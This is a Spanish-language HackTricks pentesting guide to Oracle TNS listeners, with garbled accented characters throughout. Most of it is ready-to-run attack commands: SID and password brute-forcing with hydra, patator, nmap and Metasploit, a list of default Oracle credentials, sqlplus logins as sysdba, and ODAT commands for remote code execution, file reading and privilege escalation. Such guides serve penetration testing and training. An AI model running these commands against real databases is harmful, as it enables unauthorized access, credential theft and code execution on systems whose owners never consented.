# 1521,1522-1529 - Pentesting Oracle TNS Listener

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al grupo de** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) o al grupo de [**telegram**](https://t.me/peass) o **sigue**me en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informaci√≥n B√°sica

La base de datos Oracle (Oracle DB) es un sistema de gesti√≥n de bases de datos relacionales (RDBMS) de Oracle Corporation (de [aqu√≠](https://www.techopedia.com/definition/8711/oracle-database)).

Al enumerar Oracle, el primer paso es hablar con el TNS-Listener que generalmente reside en el puerto predeterminado (1521/TCP, -tambi√©n puedes encontrar listeners secundarios en 1522‚Äì1529-).
```
1521/tcp open  oracle-tns    Oracle TNS Listener 9.2.0.1.0 (for 32-bit Windows)
1748/tcp open  oracle-tns    Oracle TNS Listener
```
## Resumen

1. **Enumerar informaci√≥n de versi√≥n** (buscar **vulns conocidas**)
2. **Fuerza bruta al TNS listener** (no siempre necesario)
3. **Enumerar**/Fuerza bruta de **nombres SID** (como nombres de bases de datos)
4. **Fuerza bruta de credenciales** para nombre SID v√°lido descubierto
5. Intentar **ejecutar c√≥digo**

Para usar los m√≥dulos de oracle de MSF necesitas instalar algunas dependencias: [**Instalaci√≥n**](oracle-pentesting-requirements-installation.md)

## Enumeraci√≥n

Herramientas que se pueden usar para esto son: nmap, MSF y [tnscmd10g](http://dokfleed.net/files/audit/tnscmd10g.zip).

### Versi√≥n del TNS listener
```bash
nmap --script "oracle-tns-version" -p 1521 -T4 -sV <IP>
msf> use auxiliary/scanner/oracle/tnslsnr_version
#apt install tnscmd10g
tnscmd10g version -p 1521 -h <IP>
```
Otros comandos √∫tiles del TNS listener:

| **Comando**  | **Prop√≥sito**                                                      |
| ------------ | ------------------------------------------------------------------ |
| ping         | Hacer ping al listener                                             |
| version      | Proporcionar la salida de la versi√≥n del listener e informaci√≥n de la plataforma |
| status       | Devolver el estado actual y las variables utilizadas por el listener |
| services     | Volcar datos del servicio                                          |
| debug        | Volcar informaci√≥n de depuraci√≥n en el registro del listener       |
| reload       | Recargar el archivo de configuraci√≥n del listener                  |
| save\_config | Escribir el archivo de configuraci√≥n del listener en una ubicaci√≥n de respaldo |
| stop         | Invocar el apagado del listener                                    |

Si **recibes un error**, podr√≠a ser porque las **versiones de TNS son incompatibles** (Usa el par√°metro `--10G` con `tnscmd10`) y si el **error persiste,** el listener puede estar **protegido por contrase√±a** (puedes ver una lista donde todos los [**errores est√°n detallados aqu√≠**](https://docs.oracle.com/database/121/ERRMG/TNS-00000.htm#ERRMG-GUID-D723D931-ECBA-4FA4-BF1B-1F4FE2EEBAD7)) ‚Äî no te preocupes‚Ä¶ hydra al rescate\*\*:\*\*
```
hydra -P rockyou.txt -t 32 -s 1521 host.victim oracle-listener
```
El listener TNS podr√≠a ser vulnerable a ataques **MitM**. [Consulta aqu√≠ c√≥mo verificar si el servidor es vulnerable y c√≥mo realizar el ataque (todas las versiones hasta la versi√≥n 12c est√°n incluidas)](tns-poison.md).

### Enumeraci√≥n de SID

#### **Qu√© es un SID**

El SID (Identificador de Servicio) es esencialmente el nombre de la base de datos, dependiendo de la instalaci√≥n puedes tener uno o m√°s SIDs predeterminados, o incluso un SID totalmente personalizado definido por el dba.

**En algunas versiones antiguas (en la 9 funciona)** podr√≠as solicitar el SID y la base de datos te lo enviaba:
```bash
tnscmd10g status-p 1521 -h <IP> #The SID are inside: SERVICE=(SERVICE_NAME=<SID_NAME>)

#msf1
msf> use auxiliary/scanner/oracle/sid_enum
msf> set rhost <IP>
msf> run
#msf2
msf> use auxiliary/admin/oracle/tnscmd
msf> set CMD (CONNECT_DATA=(COMMAND=STATUS))
msf> set rhost <IP>
msf> run #The SID are inside: SERVICE=(SERVICE_NAME=<SID_NAME>)
```
Si no puedes acceder a los SIDs de esta manera, necesitar√°s hacerles fuerza bruta:

**Fuerza Bruta de SID**

He fusionado las listas de SID de nmap y MSF en esta (sin duplicados):

{% file src="../../.gitbook/assets/sids-oracle.txt" %}
```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 <IP> oracle-sid
patator oracle_login host=<IP> sid=FILE0 0=sids-oracle.txt -x ignore:code=ORA-12505
./odat.py sidguesser -s $SERVER -d $SID --sids-file=./sids.txt
msf> use auxiliary/admin/oracle/sid_brute #This will use the list located at /usr/share/metasploit-framework/data/wordlists/sid.txt
nmap --script +oracle-sid-brute -p 1521 10.11.1.202 #This will use the list lcated at /usr/share/nmap/nselib/data/oracle-sids
```
Para usar **oracle\_login** con **patator** necesitas **instalar**:
```
pip3 install cx_Oracle --upgrade
```
## **Objetivos de Cuentas**

**¬øTienes SID?** Excelente, ahora pasemos a la siguiente tarea y extraigamos la informaci√≥n de la cuenta de usuario. Desde este punto, puedes conectarte al listener y forzar bruscamente las credenciales.

**Metasploit** _\*\*scanner/oracle/oracle\_login_ Cuenta con un diccionario incorporado para los **valores predeterminados m√°s populares de la informaci√≥n de la cuenta de usuario** presentada como login:password. Por cierto, tales entradas predeterminadas representan uno de los problemas de seguridad m√°s populares y graves en Oracle.

**Nmap** tambi√©n puede ayudar aqu√≠ con el script _oracle-brute_. Ten en cuenta que este script **mezcla los logins y las contrase√±as**, es decir, intenta cada login contra cada contrase√±a, ¬°y lleva bastante tiempo!

### **Contrase√±as Predeterminadas**

A continuaci√≥n, se presentan algunas de las contrase√±as predeterminadas asociadas con Oracle:

* **DBSNMP/DBSNMP**‚Ää‚Äî‚ÄäEl Agente Inteligente utiliza esto para comunicarse con el servidor de base de datos (es algo de trabajo cambiarlo)
* **SYS/CHANGE\_ON\_INSTALL**‚Ää‚Äî‚ÄäCuenta predeterminada de sysdba antes y hasta Oracle v9, a partir de la versi√≥n 10g esto tiene que ser diferente!
* **PCMS\_SYS/PCMS\_SYS**‚Ää‚Äî‚ÄäCuenta x predeterminada
* **WMSYS/WMSYS**‚Ää‚Äî‚ÄäCuenta x predeterminada
* **OUTLN/OUTLN**‚Ää‚Äî‚ÄäCuenta x predeterminada
* **SCOTT/TIGER**‚Ää‚Äî‚ÄäCuenta x predeterminada

Otras **contrase√±as predeterminadas** se pueden encontrar [aqu√≠](http://www.petefinnigan.com/default/oracle_default_passwords.htm) y [aqu√≠](https://cirt.net/passwords?vendor=Oracle).

Las versiones 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2 y 11.2.0.3 son vulnerables a **fuerza bruta offline**. [**Lee m√°s sobre esta t√©cnica aqu√≠.**](remote-stealth-pass-brute-force.md)

### Fuerza Bruta de Usuario/Contrase√±a

Diferentes herramientas ofrecen **listas de usuario/contrase√±a diferentes** para oracle:

* **oscan:** _/usr/share/oscanner/accounts.default_ (169 l√≠neas)
* **MSF-1:** _de_ admin/oracle/oracle\_login \_\_/usr/share/metasploit-framework/data/wordlists/oracle\_default\_passwords.csv (598 l√≠neas)
* **MSF-2:** _de scanner/oracle/oracle\_login_ _/usr/share/metasploit-framework/data/wordlists/oracle\_default\_userpass.txt_ (568 l√≠neas)
* **Nmap:** _/usr/share/nmap/nselib/data/oracle-default-accounts.lst_ (687 l√≠neas)

He **mezclado** todas ellas y **eliminado duplicados:**

{% file src="../../.gitbook/assets/users-oracle.txt" %}

{% file src="../../.gitbook/assets/pass-oracle.txt" %}

### [Fuerza Bruta](../../generic-methodologies-and-resources/brute-force.md#oraclesql)

Ahora que **sabes un SID v√°lido y credenciales v√°lidas**. Para conectarte a la base de datos necesitas la herramienta: _**sqlplus**_ y para instalarla necesitas seguir algunos pasos:

[Instalaci√≥n](oracle-pentesting-requirements-installation.md)

Para iniciar sesi√≥n utilizando credenciales conocidas:
```
sqlplus <username>/<password>@<ip_address>/<SID>;
```
Si el TNS Listener est√° en un puerto no predeterminado (por ejemplo, TCP/1522):
```
sqlplus <username>/<password>@<ip_address>:<port>/<SID>;
```
Si una **cuenta tiene privilegios de base de datos del sistema (sysdba) o de operador del sistema (sysop)**, es posible que desee intentar lo siguiente:
```bash
sqlplus <username>/<password>@<ip_address>/<SID> 'as sysdba';
#Example:
sqlplus SYSTEM/MANAGER@192.168.0.2/ORCL 'as sysdba'
```
## **Todo en Uno**

**Una herramienta interesante es oscanner**, que intentar√° obtener un SID v√°lido y luego realizar√° fuerza bruta para obtener credenciales v√°lidas y tratar de extraer informaci√≥n:
```bash
#apt install oscanner
oscanner -s <IP> -P <PORT>
```
Otra herramienta que realizar√° todo esto es [**odat**](https://github.com/quentinhardy/odat):
```bash
git clone https://github.com/quentinhardy/odat.git
cd odat
./odat.py --help #It shouldn't be problems in Kali
./odat.py all -s <IP> -p <PORT>
./odat.py all -s <IP> -p <PORT> -d <SID> #To bruteforce accounts for that SID
```
Con estas opciones (_-s_ y _-p_), ODAT realizar√° **b√∫squeda de SID v√°lidos** (System ID) en un primer paso. Puedes configurar algunas opciones para los m√©todos de configuraci√≥n (p. ej. lista de palabras o ataque de fuerza bruta). Por defecto, ODAT usar√° una gran lista de palabras y realizar√° un peque√±o ataque de fuerza bruta.

Si ODAT **encuentra al menos un SID** (por ejemplo, _ORCL_), buscar√° **cuentas Oracle v√°lidas**. Lo har√° en **cada SID encontrado**. Puedes especificar algunas opciones para las credenciales (p. ej. _--accounts-file_, _--accounts-files_, _--login-as-pwd_).

Para **cada cuenta v√°lida** (p. ej. _SYS_) **en cada instancia v√°lida** (SID), ODAT devolver√° **lo que cada usuario de Oracle puede hacer** (p. ej. shell inverso, leer archivos, convertirse en DBA).

[**Wiki de odat**](https://github.com/quentinhardy/odat/wiki)

## Ejecuci√≥n Remota de C√≥digo

Hay al menos dos formas diferentes de ejecutar comandos, como usar procedimientos de Java y el paquete DBMS\_SCHEDULER. Por cierto, tambi√©n puedes lograr RCE en caso de inyecci√≥n SQL en una aplicaci√≥n web, siempre que el usuario que la ejecute tenga los derechos suficientes. En esta etapa, recomiendo encarecidamente preparar la Herramienta de Ataque a Bases de Datos Oracle: [ODAT](https://github.com/quentinhardy/odat).

### Instalar ODAT
```bash
git clone https://github.com/quentinhardy/odat.git
cd odat
./odat.py #It shouldn't be problems in Kali
```
### Ejecutar c√≥digo a trav√©s de un Procedimiento Almacenado de Java
```bash
./odat.py java -s <IP> -U <username> -P <password> -d <SID> --exec COMMAND
```
[M√°s detalles aqu√≠](oracle-rce-and-more.md#rce-java-store-procedure)

### Ejecutar c√≥digo a trav√©s del Programador
```bash
./odat.py dbmsscheduler -s <IP> -d <SID> -U <username> -P <password> --exec "C:\windows\system32\cmd.exe /c echo 123&gt;&gt;C:\hacK"
```
[M√°s detalles aqu√≠](oracle-rce-and-more.md#rce-scheduler)

### Ejecutar c√≥digo mediante Tablas Externas
```bash
./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --exec "C:/windows/system32" "calc.exe"
```
‚ÄòODAT.py‚Äô requiere el privilegio ‚ÄòCREATE ANY DIRECTORY‚Äô, que, por defecto, se concede solo al rol DBA, ya que intenta ejecutar el archivo desde cualquier directorio y no solo "tu" directorio (la versi√≥n manual de este ataque requiere menos privilegios).

[M√°s detalles aqu√≠.](oracle-rce-and-more.md#rce-external-tables)

## Leer/Escribir archivos
```bash
./odat.py utlfile -s <IP> -d <SID> -U <username> -P <password> --getFile "C:/test" token.txt token.txt
./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --getFile "C:/test" "my4.txt" "my"
```
[M√°s detalles aqu√≠](oracle-rce-and-more.md#read-write-files)

## Elevaci√≥n de Privilegios

[M√°s detalles aqu√≠](oracle-rce-and-more.md#elevating-privileges)

Puedes usar el m√≥dulo [privesc](https://github.com/quentinhardy/odat/wiki/privesc) de odat para escalar privilegios. En ese enlace puedes encontrar **varias formas de escalar privilegios utilizando odat.**
```bash
./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD -h #Get module Help
```
Vulnerabilidad probada en oracle 10.1.0.3.0 ‚Äì deber√≠a funcionar hasta 10.1.0.5.0 y supuestamente en 11g. Solucionado con la actualizaci√≥n cr√≠tica de Oracle de octubre de 2007.
```bash
msf> use auxiliary/sqli/oracle/lt_findricset_cursor
```
## Entorno Virtual Gratuito para pruebas

Si quieres practicar ataques a bases de datos Oracle, la forma m√°s segura es registrarte en la VM de Virtualbox de Oracle Developer Days:

{% embed url="http://www.oracle.com/technetwork/database/enterprise-edition/databaseappdev-vm-161299.html" %}

La mayor parte de la informaci√≥n en este post fue extra√≠da de: [https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573](https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573) y de [https://hackmag.com/uncategorized/looking-into-methods-to-penetrate-oracle-db/](https://hackmag.com/uncategorized/looking-into-methods-to-penetrate-oracle-db/)

Otras **referencias** interesantes:

[http://blog.opensecurityresearch.com/2012/03/top-10-oracle-steps-to-secure-oracle.html](http://blog.opensecurityresearch.com/2012/03/top-10-oracle-steps-to-secure-oracle.html)

## Comandos Autom√°ticos HackTricks
```
Protocol_Name: Oracle    #Protocol Abbreviation if there is one.
Port_Number:  1521     #Comma separated if there is more than one.
Protocol_Description: Oracle TNS Listener         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for Oracle
Note: |
Oracle database (Oracle DB) is a relational database management system (RDBMS) from the Oracle Corporation

#great oracle enumeration tool
navigate to https://github.com/quentinhardy/odat/releases/
download the latest
tar -xvf odat-linux-libc2.12-x86_64.tar.gz
cd odat-libc2.12-x86_64/
./odat-libc2.12-x86_64 all -s 10.10.10.82

for more details check https://github.com/quentinhardy/odat/wiki

https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener

Entry_2:
Name: Nmap
Description: Nmap with Oracle Scripts
Command: nmap --script "oracle-tns-version" -p 1521 -T4 -sV {IP}
```
<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
